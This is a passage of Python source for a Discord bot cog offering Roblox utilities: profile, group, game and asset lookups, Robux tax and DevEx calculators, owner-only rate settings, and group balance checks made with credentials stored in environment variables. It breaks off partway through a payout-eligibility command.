"""
Roblox Commands Cog
Handles all Roblox-related commands (profile, group, stocks, etc.)
"""

import os
import re
import json
import base64
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
from datetime import datetime, timedelta
from dateutil.parser import isoparse
import asyncio

from ..config import (
    PH_TIMEZONE, BOT_OWNER_ID, ROBLOX_GROUPS, 
    ALL_GROUP_IDS, Emojis, ASSET_TYPE_MAP,
)
from ..utils import create_embed, clean_text_for_match, format_number


class RobloxCog(commands.Cog):
    """Roblox-related commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # Create the command group
    roblox = app_commands.Group(name="roblox", description="Roblox-related tools")

    # ══════════════════════════════════════════════════════════════════════════
    # GROUP INFO
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="group", description="Display information about Neroniel's Roblox Groups")
    async def group_info(self, interaction: discord.Interaction):
        await interaction.response.defer()

        async with aiohttp.ClientSession() as session:
            for group_id in ALL_GROUP_IDS:
                try:
                    # Fetch group info
                    async with session.get(f"https://groups.roblox.com/v1/groups/{group_id}") as resp:
                        if resp.status != 200:
                            continue
                        data = await resp.json()

                    # Fetch icon
                    icon_url = None
                    try:
                        async with session.get(
                            f"https://thumbnails.roproxy.com/v1/groups/icons?groupIds={group_id}&size=420x420&format=Png"
                        ) as icon_resp:
                            if icon_resp.status == 200:
                                icon_data = await icon_resp.json()
                                if icon_data.get("data"):
                                    icon_url = icon_data["data"][0]["imageUrl"]
                    except Exception:
                        pass

                    embed = create_embed()
                    embed.add_field(
                        name="Group Name",
                        value=f"[{data['name']}](https://www.roblox.com/groups/{group_id})",
                        inline=False,
                    )
                    embed.add_field(
                        name="Description", 
                        value=data.get("description", "No description") or "No description",
                        inline=False,
                    )
                    embed.add_field(name="Group ID", value=str(data["id"]), inline=True)

                    owner = data.get("owner")
                    owner_link = (
                        f"[{owner['username']}](https://www.roblox.com/users/{owner['userId']}/profile)"
                        if owner else "No Owner"
                    )
                    embed.add_field(name="Owner", value=owner_link, inline=True)
                    embed.add_field(name="Members", value=f"{data['memberCount']:,}", inline=True)

                    if icon_url:
                        embed.set_thumbnail(url=icon_url)

                    await interaction.followup.send(embed=embed)
                    await asyncio.sleep(0.5)

                except Exception as e:
                    await interaction.followup.send(f"❌ Error fetching group {group_id}: {e}")

    # ══════════════════════════════════════════════════════════════════════════
    # PROFILE
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="profile", description="View a player's profile")
    @app_commands.describe(user="Roblox username or user ID")
    async def profile(self, interaction: discord.Interaction, user: str):
        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                # Resolve user
                if user.isdigit():
                    user_id = int(user)
                    async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as resp:
                        if resp.status != 200:
                            return await interaction.followup.send("❌ User not found.", ephemeral=True)
                        full_data = await resp.json()
                        username = full_data["name"]
                        display_name = full_data["displayName"]
                else:
                    async with session.post(
                        "https://users.roblox.com/v1/usernames/users",
                        json={"usernames": [user]},
                        headers={"Content-Type": "application/json"},
                    ) as resp:
                        data = await resp.json()
                        if not data["data"]:
                            return await interaction.followup.send("❌ User not found.", ephemeral=True)
                        user_id = data["data"][0]["id"]
                        display_name = data["data"][0]["displayName"]

                    async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as resp:
                        full_data = await resp.json()
                        username = full_data["name"]

                # Get presence
                status = "Offline"
                last_online = "N/A"
                async with session.post(
                    "https://presence.roblox.com/v1/presence/users",
                    json={"userIds": [user_id]},
                ) as resp:
                    if resp.status == 200:
                        p = (await resp.json())["userPresences"][0]
                        presence_type = p.get("userPresenceType", 0)

                        if presence_type == 1:
                            status = "Online"
                        elif presence_type == 2:
                            status = "In Game"
                        elif presence_type == 3:
                            status = "In Studio"

                        if p.get("lastOnline"):
                            last_online = isoparse(p["lastOnline"]).astimezone(PH_TIMEZONE).strftime("%A, %d %B %Y • %I:%M %p")

                # Get avatar
                thumb_url = f"https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png"
                async with session.get(thumb_url) as resp:
                    image_url = (await resp.json())["data"][0]["imageUrl"]

                # Build Components V2
                created_at = isoparse(full_data["created"])
                created_unix = int(created_at.timestamp())
                description = full_data.get("description") or "N/A"

                verified = full_data.get("hasVerifiedBadge", False)
                emoji = Emojis.VERIFIED if verified else ""

                # Get friend counts
                async with session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count") as r1, \
                           session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count") as r2, \
                           session.get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count") as r3:
                    friends = (await r1.json()).get("count", 0)
                    followers = (await r2.json()).get("count", 0)
                    followings = (await r3.json()).get("count", 0)

                # Get premium status (requires cookie)
                premium = False
                try:
                    async with session.get(
                        f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                        headers={"Cookie": os.getenv("ROBLOX_COOKIE")},
                    ) as r4:
                        premium = await r4.json() if r4.status == 200 else False
                except Exception:
                    pass

                status_line = f"**Status:** {status}"
                if status == "Offline" and last_online != "N/A":
                    status_line += f" ({last_online})"

                now_unix = int(datetime.now(PH_TIMEZONE).timestamp())

                badge_emojis = ""
                if verified:
                    badge_emojis += f" {Emojis.VERIFIED}"
                if premium:
                    badge_emojis += f" {Emojis.PREMIUM}"

                container = discord.ui.Container(
                    discord.ui.Section(
                        discord.ui.TextDisplay(f"### [{display_name}](https://www.roblox.com/users/{user_id}/profile)"),
                        discord.ui.TextDisplay(f"## Roblox Information\n**@{username} ({user_id})**{badge_emojis}"),
                        discord.ui.TextDisplay(f"**Account Created:** <t:{created_unix}:f>"),
                        accessory=discord.ui.Thumbnail(image_url),
                    ),
                    discord.ui.Separator(),
                    discord.ui.TextDisplay("**## Description**"),
                    discord.ui.TextDisplay(f"```{description[:1000]}```"),
                    discord.ui.Separator(),
                    discord.ui.TextDisplay(f"**Connections:** {friends}/{followers}/{followings}\n{status_line}"),
                    discord.ui.Separator(visible=False),
                    discord.ui.TextDisplay(f"-# Neroniel • <t:{now_unix}:f>"),
                )

                view = discord.ui.LayoutView()
                view.add_item(container)
                await interaction.followup.send(view=view)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # AVATAR
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="avatar", description="Display a player's full-body avatar")
    @app_commands.describe(user="Roblox username or user ID")
    async def avatar(self, interaction: discord.Interaction, user: str):
        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                # Resolve user
                if user.isdigit():
                    user_id = int(user)
                else:
                    async with session.post(
                        "https://users.roblox.com/v1/usernames/users",
                        json={"usernames": [user]},
                    ) as resp:
                        data = await resp.json()
                        if not data["data"]:
                            return await interaction.followup.send("❌ User not found.", ephemeral=True)
                        user_id = data["data"][0]["id"]

                # Get avatar
                thumb_url = f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false"
                async with session.get(thumb_url) as resp:
                    data = await resp.json()
                    image_url = data["data"][0]["imageUrl"]

                embed = create_embed()
                embed.set_image(url=image_url)
                await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # STOCKS
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="stocks", description="Check Robux balances across all managed groups")
    async def stocks(self, interaction: discord.Interaction):
        await interaction.response.defer()

        all_data = {}
        all_visible = {}

        async def fetch_group_data(session, group_id, cookie, key):
            data = {f"{key}_funds": 0, f"{key}_pending": 0}
            visible = {f"{key}_funds": False, f"{key}_pending": False}
            headers = {"Cookie": cookie}

            try:
                async with session.get(
                    f"https://economy.roblox.com/v1/groups/{group_id}/currency",
                    headers=headers,
                ) as r:
                    if r.status == 200:
                        res = await r.json()
                        data[f"{key}_funds"] = res.get("robux", 0)
                        visible[f"{key}_funds"] = True

                await asyncio.sleep(0.3)

                async with session.get(
                    f"https://apis.roblox.com/transaction-records/v1/groups/{group_id}/revenue/summary/day",
                    headers=headers,
                ) as r:
                    if r.status == 200:
                        res = await r.json()
                        data[f"{key}_pending"] = res.get("pendingRobux", 0)
                        visible[f"{key}_pending"] = True

            except Exception as e:
                print(f"[STOCKS] Error fetching {key}: {e}")

            return data, visible

        async with aiohttp.ClientSession() as session:
            for key, cfg in ROBLOX_GROUPS.items():
                cookie = os.getenv(cfg["cookie_env"])
                if not cookie:
                    continue

                data, visible = await fetch_group_data(session, cfg["id"], cookie, key)
                all_data.update(data)
                all_visible.update(visible)
                await asyncio.sleep(0.3)

            # Fetch personal account 1
            roblox_stocks_cookie = os.getenv("ROBLOX_STOCKS")
            roblox_user_id = os.getenv("ROBLOX_STOCKS_ID")

            if roblox_stocks_cookie and roblox_user_id:
                headers1 = {"Cookie": roblox_stocks_cookie}
                try:
                    async with session.get(
                        f"https://economy.roblox.com/v1/users/{roblox_user_id}/currency",
                        headers=headers1,
                    ) as r:
                        if r.status == 200:
                            res = await r.json()
                            all_data["account_balance"] = res.get("robux", 0)
                            all_visible["account_balance"] = True
                except Exception:
                    all_visible["account_balance"] = False

                await asyncio.sleep(0.3)

                try:
                    async with session.get(
                        f"https://economy.roblox.com/v2/users/{roblox_user_id}/transaction-totals?timeFrame=Month&transactionType=summary",
                        headers=headers1,
                    ) as r:
                        if r.status == 200:
                            res = await r.json()
                            all_data["account_pending"] = res.get("pendingRobuxTotal", 0)
                            all_visible["account_pending"] = True
                except Exception as e:
                    print(f"[STOCKS] account1 pending error: {e}")

            # Fetch personal account 2
            roblox_stocks_cookie2 = os.getenv("ROBLOX_STOCKS2")
            roblox_user_id2 = os.getenv("ROBLOX_STOCKS_ID2")

            if roblox_stocks_cookie2 and roblox_user_id2:
                headers2 = {"Cookie": roblox_stocks_cookie2}
                try:
                    async with session.get(
                        f"https://economy.roblox.com/v1/users/{roblox_user_id2}/currency",
                        headers=headers2,
                    ) as r:
                        if r.status == 200:
                            res = await r.json()
                            all_data["account_balance2"] = res.get("robux", 0)
                            all_visible["account_balance2"] = True
                except Exception:
                    all_visible["account_balance2"] = False

                await asyncio.sleep(0.3)

                try:
                    async with session.get(
                        f"https://economy.roblox.com/v2/users/{roblox_user_id2}/transaction-totals?timeFrame=Month&transactionType=summary",
                        headers=headers2,
                    ) as r:
                        if r.status == 200:
                            res = await r.json()
                            all_data["account_pending2"] = res.get("pendingRobuxTotal", 0)
                            all_visible["account_pending2"] = True
                except Exception as e:
                    print(f"[STOCKS] account2 pending error: {e}")

        def fmt(key):
            return f"{Emojis.ROBUX} {all_data.get(key, 0):,}" if all_visible.get(key) else "||HIDDEN||"

        # ── Group Payout lines ──
        group_lines = []
        for key, cfg in ROBLOX_GROUPS.items():
            group_lines.append(f"**⌖ __{cfg['label']}__**")
            group_lines.append(f"{fmt(f'{key}_funds')} | {fmt(f'{key}_pending')}")

        # ── Personal Account lines ── always shown, ||HIDDEN|| if cookie invalid
        account_lines = [
            f"**⌖ __Neroniel__ Account Balance**",
            fmt("account_balance"),
            fmt("account_balance2"),
        ]

        now_unix = int(datetime.now(PH_TIMEZONE).timestamp())
        bot_avatar = interaction.client.user.avatar.url if interaction.client.user.avatar else None

        thumbnail = discord.ui.Thumbnail(bot_avatar) if bot_avatar else discord.ui.Thumbnail(
            "https://cdn.discordapp.com/embed/avatars/0.png"
        )

        container = discord.ui.Container(
            discord.ui.Section(
                discord.ui.TextDisplay("## Robux Stocks Information"),
                discord.ui.TextDisplay("### Community Funds | Pending Robux"),
                accessory=thumbnail,
            ),
            discord.ui.Separator(),
            discord.ui.TextDisplay("### Group Payout"),
            discord.ui.TextDisplay("\n".join(group_lines)),
            discord.ui.Separator(),
            discord.ui.TextDisplay("### Plus/Gamepass/In-Game Gift"),
            discord.ui.TextDisplay(
                f"**⌖ __Neroniel__ Account Balance**\n"
                f"{fmt('account_balance')} | {fmt('account_pending')}\n"
                f"{fmt('account_balance2')} | {fmt('account_pending2')}"
            ),
            discord.ui.Separator(visible=False),
            discord.ui.TextDisplay(f"-# Neroniel • <t:{now_unix}:f>"),
        )

        view = discord.ui.LayoutView()
        view.add_item(container)
        await interaction.followup.send(view=view)

    # ══════════════════════════════════════════════════════════════════════════
    # GAMEPASS
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="gamepass", description="Generate a direct Gamepass link")
    @app_commands.describe(id="The Roblox Gamepass ID", link="Roblox Creator Dashboard URL")
    async def gamepass(self, interaction: discord.Interaction, id: int = None, link: str = None):
        if id is not None and link is not None:
            await interaction.response.send_message("❌ Provide either ID or Link, not both.", ephemeral=True)
            return

        if id is None and link is None:
            await interaction.response.send_message("❌ Provide a Gamepass ID or Link.", ephemeral=True)
            return

        pass_id = id
        if link:
            match = re.search(r'/passes/(\d+)/', link)
            if match:
                pass_id = match.group(1)
            else:
                await interaction.response.send_message("❌ Invalid Gamepass Link.", ephemeral=True)
                return

        base_url = f"https://www.roblox.com/game-pass/{pass_id}"
        embed = create_embed()
        embed.add_field(name="🔗 Link", value=f"`{base_url}`\n[View Gamepass]({base_url})", inline=False)

        await interaction.response.send_message(embed=embed)

    # ══════════════════════════════════════════════════════════════════════════
    # DEVEX
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="devex", description="Convert Robux ↔ USD using DevEx rate")
    @app_commands.describe(conversion_type="Choose conversion type", amount="Amount to convert")
    @app_commands.choices(conversion_type=[
        app_commands.Choice(name="Robux to USD", value="robux"),
        app_commands.Choice(name="USD to Robux", value="usd"),
    ])
    async def devex(
        self, 
        interaction: discord.Interaction, 
        conversion_type: app_commands.Choice[str], 
        amount: float
    ):
        if amount <= 0:
            await interaction.response.send_message("❗ Enter a positive amount.", ephemeral=True)
            return

        devex_rate = 0.0038

        if conversion_type.value == "robux":
            usd = amount * devex_rate
            embed = create_embed(title="💎 DevEx: Robux → USD")
            embed.description = f"Converting **{format_number(amount)} Robux** at $0.0038/Robux"
            embed.add_field(name="Total USD", value=f"**${format_number(usd)}**", inline=False)
        else:
            robux = amount / devex_rate
            embed = create_embed(title="💎 DevEx: USD → Robux")
            embed.description = f"Converting **${format_number(amount)} USD** at $0.0038/Robux"
            embed.add_field(name="Total Robux", value=f"{Emojis.ROBUX} **{format_number(robux)}**", inline=False)

        await interaction.response.send_message(embed=embed)

    # ══════════════════════════════════════════════════════════════════════════
    # TAX
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="tax", description="Calculate Roblox's 30% marketplace tax")
    @app_commands.describe(amount="Robux amount")
    async def tax(self, interaction: discord.Interaction, amount: int):
        if amount <= 0:
            await interaction.response.send_message("❗ Enter a positive amount.", ephemeral=True)
            return

        after_tax = int(amount * 0.7)
        tax_amount = amount - after_tax
        price_to_get = int(amount / 0.7)

        embed = create_embed(title="💰 Roblox Tax Calculator")
        embed.add_field(name="Original Amount", value=f"{Emojis.ROBUX} {amount:,}", inline=False)
        embed.add_field(name="After 30% Tax", value=f"{Emojis.ROBUX} {after_tax:,}", inline=True)
        embed.add_field(name="Tax Amount", value=f"{Emojis.ROBUX} {tax_amount:,}", inline=True)
        embed.add_field(name="Price to Get Full Amount", value=f"{Emojis.ROBUX} {price_to_get:,}", inline=False)

        await interaction.response.send_message(embed=embed)

    # ══════════════════════════════════════════════════════════════════════════
    # GAME
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="game", description="Get detailed game info")
    @app_commands.describe(id="Place ID or Game URL")
    async def game(self, interaction: discord.Interaction, id: str):
        await interaction.response.defer()

        # Extract place ID
        place_id = None
        if id.isdigit():
            place_id = int(id)
        else:
            match = re.search(r'roblox\.com/games/(\d+)', id)
            if match:
                place_id = int(match.group(1))

        if not place_id:
            return await interaction.followup.send("❌ Invalid Place ID or URL.", ephemeral=True)

        try:
            async with aiohttp.ClientSession() as session:
                # Get universe ID
                async with session.get(
                    f"https://apis.roblox.com/universes/v1/places/{place_id}/universe"
                ) as resp:
                    if resp.status != 200:
                        raise Exception("Invalid Place ID")
                    universe_id = (await resp.json()).get("universeId")

                # Get game info
                async with session.get(
                    f"https://games.roblox.com/v1/games?universeIds={universe_id}"
                ) as resp:
                    data = await resp.json()
                    if not data.get("data"):
                        raise Exception("Game not found")

                game = data["data"][0]

                # Get votes
                async with session.get(
                    f"https://games.roblox.com/v1/games/votes?universeIds={universe_id}"
                ) as resp:
                    votes = (await resp.json())["data"][0] if resp.status == 200 else {}

                # Get thumbnail
                async with session.get(
                    f"https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&size=150x150&format=Png"
                ) as resp:
                    thumb_data = await resp.json()
                    thumbnail = thumb_data["data"][0]["imageUrl"] if thumb_data.get("data") else None

                # Build embed
                creator = game.get("creator", {})
                creator_name = creator.get("name", "Unknown")

                embed = create_embed()

                game_link = f"https://www.roblox.com/games/{place_id}"
                embed.add_field(
                    name="", 
                    value=f"**[{game['name']}]({game_link})**\n\n{game.get('description', '')[:500]}",
                    inline=False,
                )
                embed.add_field(name="Creator", value=creator_name, inline=True)
                embed.add_field(name="Playing", value=f"{game.get('playing', 0):,}", inline=True)
                embed.add_field(name="Visits", value=f"{game.get('visits', 0):,}", inline=True)
                embed.add_field(
                    name="Likes | Dislikes | Favorites",
                    value=f"{votes.get('upVotes', 0):,} | {votes.get('downVotes', 0):,} | {game.get('favoritedCount', 0):,}",
                    inline=True,
                )
                embed.add_field(name="Max Players", value=str(game.get("maxPlayers", "N/A")), inline=True)

                if thumbnail:
                    embed.set_thumbnail(url=thumbnail)

                await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # COMMUNITY SEARCH
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="community", description="Search public Roblox groups")
    @app_commands.describe(name="Name or ID")
    async def community(self, interaction: discord.Interaction, name: str):
        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                group_id = None

                if name.isdigit():
                    group_id = int(name)
                else:
                    # Search
                    async with session.get(
                        f"https://groups.roblox.com/v1/groups/search?keyword={name}&limit=100"
                    ) as resp:
                        if resp.status != 200:
                            return await interaction.followup.send("❌ Search failed.", ephemeral=True)

                        data = await resp.json()
                        groups = data.get("data", [])

                        if not groups:
                            return await interaction.followup.send(f"❌ No group found: `{name}`", ephemeral=True)

                        # Find best match
                        clean_query = clean_text_for_match(name)
                        best_match = None

                        for group in groups:
                            if clean_text_for_match(group["name"]) == clean_query:
                                best_match = group
                                break

                        if not best_match:
                            candidates = [g for g in groups if clean_query in clean_text_for_match(g["name"])]
                            best_match = max(candidates, key=lambda g: g.get("memberCount", 0)) if candidates else groups[0]

                        group_id = best_match["id"]

                # Fetch group info
                async with session.get(f"https://groups.roblox.com/v1/groups/{group_id}") as resp:
                    if resp.status != 200:
                        return await interaction.followup.send("❌ Group not found.", ephemeral=True)
                    group_data = await resp.json()

                # Fetch icon
                icon_url = None
                try:
                    async with session.get(
                        f"https://thumbnails.roproxy.com/v1/groups/icons?groupIds={group_id}&size=420x420&format=Png"
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("data"):
                                icon_url = data["data"][0]["imageUrl"]
                except Exception:
                    pass

                embed = create_embed()
                embed.add_field(
                    name="Group Name",
                    value=f"[{group_data['name']}](https://www.roblox.com/groups/{group_id})",
                    inline=False,
                )
                embed.add_field(
                    name="Description",
                    value=group_data.get("description", "No description") or "No description",
                    inline=False,
                )
                embed.add_field(name="Group ID", value=str(group_data["id"]), inline=True)

                owner = group_data.get("owner")
                owner_link = (
                    f"[{owner['username']}](https://www.roblox.com/users/{owner['userId']}/profile)"
                    if owner else "No Owner"
                )
                embed.add_field(name="Owner", value=owner_link, inline=True)
                embed.add_field(name="Members", value=f"{group_data['memberCount']:,}", inline=True)

                if icon_url:
                    embed.set_thumbnail(url=icon_url)

                await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)


    # ══════════════════════════════════════════════════════════════════════════
    # RATE (SET CONVERSION RATES)
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="rate", description="Set global minimum conversion rates (Bot Owner only)")
    @app_commands.describe(
        payout="PHP per 1,000 Robux — Payout rate",
        gift="PHP per 1,000 Robux — Gift rate",
        nct="PHP per 1,000 Robux — NCT rate",
        ct="PHP per 1,000 Robux — CT rate",
    )
    async def rate(
        self,
        interaction: discord.Interaction,
        payout: float = None,
        gift: float = None,
        nct: float = None,
        ct: float = None,
    ):
        from ..database import db
        from ..utils import get_current_rates, format_php
        from ..config import Emojis

        if interaction.user.id != BOT_OWNER_ID:
            await interaction.response.send_message("❌ Only the bot owner can use this command.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        if not db.is_connected:
            await interaction.followup.send("❌ Database not connected.", ephemeral=True)
            return

        GLOBAL_KEY = "__global__"

        # If no arguments, show current global minimums
        if all(v is None for v in [payout, gift, nct, ct]):
            doc = db.rates.find_one({"guild_id": GLOBAL_KEY}) or {}
            embed = discord.Embed(title="📊 Global Minimum Rates", color=discord.Color.from_rgb(0, 0, 0))
            robux_formatted = "1,000"

            def _show(min_key):
                min_val = doc.get(min_key)
                return f"{Emojis.PHP} {format_php(min_val)}" if min_val is not None else "Not Set"

            embed.add_field(name=f"{Emojis.ROBUX} {robux_formatted} • Payout", value=_show("payout_min"), inline=False)
            embed.add_field(name=f"{Emojis.ROBUX} {robux_formatted} • Gift",   value=_show("gift_min"),   inline=False)
            embed.add_field(name=f"{Emojis.ROBUX} {robux_formatted} • NCT",    value=_show("nct_min"),    inline=False)
            embed.add_field(name=f"{Emojis.ROBUX} {robux_formatted} • CT",     value=_show("ct_min"),     inline=False)
            embed.set_footer(text="These are the global minimums — /setrate cannot go below these in any server")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        # Validate: no negatives or zeros
        errors = []
        for label, val in [("Payout", payout), ("Gift", gift), ("NCT", nct), ("CT", ct)]:
            if val is not None and val <= 0:
                errors.append(f"{label} must be greater than 0")
        if errors:
            await interaction.followup.send("❗ " + "\n".join(errors), ephemeral=True)
            return

        # Save globally — these become the floor enforced by /setrate in ALL servers
        update_fields = {"guild_id": GLOBAL_KEY, "updated_at": datetime.now(PH_TIMEZONE)}
        if payout is not None:
            update_fields["payout_min"] = payout
        if gift is not None:
            update_fields["gift_min"] = gift
        if nct is not None:
            update_fields["nct_min"] = nct
        if ct is not None:
            update_fields["ct_min"] = ct

        db.rates.update_one({"guild_id": GLOBAL_KEY}, {"$set": update_fields}, upsert=True)

        embed = discord.Embed(
            title="✅ Global Minimum Rates Set",
            description="These values are now the **global floor** for all servers.\n`/setrate` cannot go below them in any server.",
            color=discord.Color.green(),
        )
        robux_formatted = "1,000"
        if payout is not None:
            embed.add_field(name="• Payout (min)", value=f"{Emojis.ROBUX} {robux_formatted} → {Emojis.PHP} {format_php(payout)}", inline=False)
        if gift is not None:
            embed.add_field(name="• Gift (min)",   value=f"{Emojis.ROBUX} {robux_formatted} → {Emojis.PHP} {format_php(gift)}", inline=False)
        if nct is not None:
            embed.add_field(name="• NCT (min)",    value=f"{Emojis.ROBUX} {robux_formatted} → {Emojis.PHP} {format_php(nct)}", inline=False)
        if ct is not None:
            embed.add_field(name="• CT (min)",     value=f"{Emojis.ROBUX} {robux_formatted} → {Emojis.PHP} {format_php(ct)}", inline=False)
        embed.set_footer(text="Neroniel • /roblox rate")

        await interaction.followup.send(embed=embed, ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # ICON
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="icon", description="Fetch a game's official icon using Place ID or Game URL")
    @app_commands.describe(id="Place ID or full Roblox Game URL")
    async def icon(self, interaction: discord.Interaction, id: str):
        place_id = None
        if id.isdigit():
            place_id = int(id)
        else:
            match = re.search(r'roblox\.com/games/(\d+)', id)
            if match:
                place_id = int(match.group(1))
            else:
                await interaction.response.send_message(
                    "❌ Invalid input. Please provide a valid Place ID or Roblox Game URL.",
                    ephemeral=True,
                )
                return

        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={place_id}&size=512x512&format=Png&isCircular=false"
                ) as resp:
                    if resp.status != 200:
                        raise Exception("Failed to fetch icon")
                    icon_data = await resp.json()
                    if not icon_data.get("data") or not icon_data["data"][0].get("imageUrl"):
                        raise Exception("No icon available")
                    image = icon_data["data"][0]["imageUrl"]

            embed = create_embed()
            embed.set_image(url=image)
            embed.set_footer(text="Neroniel • /roblox icon")
            await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Failed to fetch game icon: `{str(e)}`", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # ASSET
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="asset", description="Fetch full Roblox asset info (Image, Shirt, Pants, etc.)")
    @app_commands.describe(asset_id="Roblox Asset ID")
    async def asset(self, interaction: discord.Interaction, asset_id: int):
        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

                async with session.get(
                    f"https://economy.roblox.com/v2/assets/{asset_id}/details",
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status != 200:
                        return await interaction.followup.send(
                            f"❌ Asset not found (HTTP {resp.status}).", ephemeral=True
                        )
                    data = await resp.json()

                name = data.get("Name", f"Asset {asset_id}")
                description = (data.get("Description") or "").strip()
                asset_type_id = data.get("AssetTypeId", 0)
                asset_type = ASSET_TYPE_MAP.get(asset_type_id, f"Type {asset_type_id}")
                template_asset_id = data.get("TemplateAssetId")
                created_at = data.get("Created")
                updated_at = data.get("Updated")

                creator_data = data.get("Creator", {}) or {}
                creator_name = creator_data.get("Name", "Unknown")
                creator_type = str(creator_data.get("CreatorType", "User")).lower()
                creator_id = creator_data.get("CreatorTargetId") or creator_data.get("Id")
                has_verified = creator_data.get("HasVerifiedBadge", False)
                verified_badge = f" {Emojis.VERIFIED}" if has_verified else ""

                if creator_id:
                    if creator_type == "group":
                        creator_value = f"[{creator_name}{verified_badge}](https://www.roblox.com/groups/{creator_id})"
                    else:
                        creator_value = f"[{creator_name}{verified_badge}](https://www.roblox.com/users/{creator_id}/profile)"
                else:
                    creator_value = f"{creator_name}{verified_badge}"

                if asset_type_id in [11, 12, 2] and template_asset_id:
                    delivery_id = template_asset_id
                else:
                    delivery_id = asset_id

                delivery_url = f"https://assetdelivery.roblox.com/v1/asset/?id={delivery_id}"
                image_url = None

                try:
                    async with session.head(delivery_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as head_resp:
                        content_type = head_resp.headers.get("Content-Type", "")
                        if "image" in content_type:
                            image_url = delivery_url
                except Exception:
                    pass

                embed = create_embed()
                name_link = f"[{name}](https://www.roblox.com/catalog/{asset_id})"
                embed.add_field(name="", value=f"**{name_link}**", inline=False)

                if description:
                    desc_text = description if len(description) <= 400 else description[:397] + "..."
                    embed.add_field(name="Description", value=desc_text, inline=False)

                embed.add_field(name="Creator", value=creator_value, inline=True)
                embed.add_field(name="Asset Type", value=asset_type, inline=True)
                embed.add_field(name="Original ID", value=str(asset_id), inline=True)
                embed.add_field(
                    name="Asset File",
                    value=f"[Download / View Raw]({delivery_url})",
                    inline=False,
                )

                if template_asset_id:
                    template_link = f"[{template_asset_id}](https://create.roblox.com/store/asset/{template_asset_id})"
                    embed.add_field(name="Template ID", value=template_link, inline=True)

                if created_at and updated_at:
                    try:
                        c_unix = int(isoparse(created_at).timestamp())
                        u_unix = int(isoparse(updated_at).timestamp())
                        embed.add_field(
                            name="Created | Updated",
                            value=f"<t:{c_unix}:f> | <t:{u_unix}:f>",
                            inline=True,
                        )
                    except Exception:
                        pass

                if image_url:
                    embed.set_image(url=image_url)

                embed.set_footer(text="Neroniel • /roblox asset")
                await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: `{str(e)}`", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # CHECKPAYOUT
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="checkpayout", description="Verify payout eligibility across all supported groups")
    @app_commands.describe(username="Roblox username")
    async def checkpayout(self, interaction: discord.Interaction, username: str):
        await interaction.response.defer()

        groups = {
            "1cy":      {"id": "5838002",     "cookie_env": "ROBLOX_COOKIE",  "name": "1cy",                     "url": "https://www.roblox.com/groups/5838002"},
            "mc":       {"id": "1081179215",  "cookie_env": "ROBLOX_COOKIE2", "name": "Modded Corporations",     "url": "https://www.roblox.com/groups/1081179215"},
            "sb":       {"id": "35341321",    "cookie_env": "ROBLOX_COOKIE2", "name": "Sheboyngo",               "url": "https://www.roblox.com/groups/35341321"},
            "bsm":      {"id": "42939987",    "cookie_env": "ROBLOX_COOKIE2", "name": "Brazilian Spyder Market", "url": "https://www.roblox.com/groups/42939987"},
            "mpg":      {"id": "365820076",   "cookie_env": "ROBLOX_COOKIE2", "name": "MPG Studios",             "url": "https://www.roblox.com/groups/365820076"},
            "cd":       {"id": "7411911",     "cookie_env": "ROBLOX_COOKIE2", "name": "Content Deleted",         "url": "https://www.roblox.com/groups/7411911"},
            "neroniel": {"id": "11136234",    "cookie_env": "ROBLOX_COOKIE",  "name": "Neroniel",                "url": "https://www.roblox.com/groups/11136234"},
        }

        cookies = {}
        missing_cookies = []
        for key, info in groups.items():
            cookie = os.getenv(info["cookie_env"])
            if not cookie:
                missing_cookies.append(info["cookie_env"])
            else:
